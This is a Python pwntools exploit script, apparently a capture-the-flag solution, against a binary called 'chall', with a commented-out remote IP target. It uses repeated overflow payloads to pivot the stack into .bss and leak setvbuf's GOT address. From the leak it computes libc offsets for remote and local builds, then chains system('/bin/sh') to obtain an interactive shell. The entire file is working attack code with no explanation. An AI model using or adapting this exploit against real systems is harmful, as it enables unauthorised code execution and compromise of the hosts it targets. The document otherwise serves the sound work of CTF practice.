from pwn import *
r = process('./chall')
# r = remote('188.166.177.88', 11101)
bss = 0x404a00
write_leak = 0x4011FD # rsi is loc
poprsir15 = 0x00401299
poprdi = 0x0040129b
ret = 0x0040129c
alarm_got = 0x403FD8
setvbuf_got = 0x403FE8
another = 0x404050
r.recvuntil('yow: ')
payload = p64(bss)
r.send(payload)

r.recvuntil('yaharo: ')
payload = 'a'*8 + p64(another+0x18) + p64(0x4011C5)
r.send(payload)

r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)

r.recvuntil('yaharo: ')
payload = p64(write_leak) + p64(another-0x10) + p64(0x4011C5) # 4
r.send(payload)

r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)

r.recvuntil('yaharo: ')
payload = 'c'*8 + p64(another+0x20) + p64(0x4011C5)
r.send(payload)

r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)

r.recvuntil('yaharo: ')
payload = p64(0x4011C5) + p64(another-0x10) + p64(0x4011C5) # 5
r.send(payload)

r.recvuntil('yow: ')
payload = p64(setvbuf_got) + p64(0) # 2 3
r.send(payload)

r.recvuntil('yaharo: ')
payload = 'e'*8 + p64(bss) + p64(poprsir15) # 1
r.send(payload)
leak = u64(r.recv(8))
print hex(leak)
# remote
libc_base = leak - 0x000000000076cd0
libc_system = libc_base + 0x0000000000048e50
libc_binsh = libc_base + 0x18a156
libc_onegadget = libc_base + 0xcbd20
# local
# libc_base = leak - 0x87e60
# libc_system = libc_base + 0x55410
# libc_binsh = libc_base + 0x1b75aa
# libc_onegadget = libc_base + 0xe6e73
print 'libc', hex(libc_base)
print 'sys', hex(libc_system)
print 'binsh', hex(libc_binsh)
payload = 'c'*8 + p64(another-0x10) + p64(0x4011C5)
r.send(payload)
r.recvuntil('yow: ')
payload = p64(bss)
r.send(payload)
r.recvuntil('yaharo: ')
payload = 'a'*8 + p64(bss+0x18) + p64(0x4011C5)
r.send(payload)
r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)
r.recvuntil('yaharo: ')
payload = 'b'*8 + p64(another-0x10) + p64(0x4011C5) # 2
r.send(payload)
r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)
r.recvuntil('yaharo: ')
payload = 'c'*8 + p64(bss+0x20) + p64(0x4011C5)
r.send(payload)
r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)
r.recvuntil('yaharo: ')
payload = p64(libc_binsh) + p64(another-0x10) + p64(0x4011C5) # 3
r.send(payload)
r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)
r.recvuntil('yaharo: ')
payload = 'e'*8 + p64(bss+0x28) + p64(0x4011C5)
r.send(payload)
r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)
r.recvuntil('yaharo: ')
payload = p64(libc_system) + p64(another-0x10) + p64(0x4011C5) # 4
r.send(payload)
r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)
r.recvuntil('yaharo: ')
payload = 'g'*8 + p64(bss+0x8) + p64(0x4011C5)
r.send(payload)
r.recvuntil('yow: ')
payload = 'z'*0x10
r.send(payload)
r.recvuntil('yaharo: ')
payload = 'g'*8 + p64(bss) + p64(poprdi) # 1
r.send(payload)
r.interactive()
